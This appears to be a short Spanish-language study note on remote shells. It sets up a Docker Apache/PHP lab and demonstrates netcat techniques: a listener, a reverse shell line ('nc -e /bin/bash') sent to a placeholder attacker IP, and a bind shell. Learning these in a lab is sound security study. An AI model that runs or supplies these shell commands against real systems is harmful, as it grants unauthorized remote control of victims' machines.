> Las **shells remotas** permiten obtener ejecución interactiva de comandos en un sistema remoto tras explotar una vulnerabilidad o lograr ejecución de código.

Se dividen principalmente en:
- [[Reverse shell]]
- [[Bind shell]]
- [[Forwarding shell]]

## Laboratorio
```dockerfile
FROM ubuntu:latest

ENV DEBIAN_FRONTEND=noninteractive

EXPOSE 80

RUN apt update && apt install -y apache2 \
	php
	
CMD ["apache2ctl","-D","FOREGROUND"]

```
- Armamos una maquina con Docker
```
docker build -t my_image .
docker run -dit --name myContainer my_image
docker exec -it myContainer bash
```

### Reverse shell
- En una terminal B, otra, vamos a ejecutar:
`nc -nlvp 443` - Estamos escuchando en el puerto 443
- `-n` no quiero resolucion DNS
- `-l` escuchar 
- `-v` verbose
- `-p` puerto

- Y dentro del contenedor de docker le mandamos una shell a la terminal B:
`nc -e /bin/bash ip/atacante 443`
- Listo, la terminal B tiene acceso, para tener una terminal mas comoda:
`script /dev/null -c bash`

### Bind shell
- Dentro del contenedor nos ponemos en escucha y mandamos una bash
`nc -nlvp 443 -e /bin/bash`
- En la terminal B interceptamos ese puerto
`nc 172.17.0.2 443` - seria la IP de la Victima, pero como es un contenedor de Docker suele ser ese.
## Herramientas
- [[netcat]]
- [[Reverse Shell Cheatsheet]]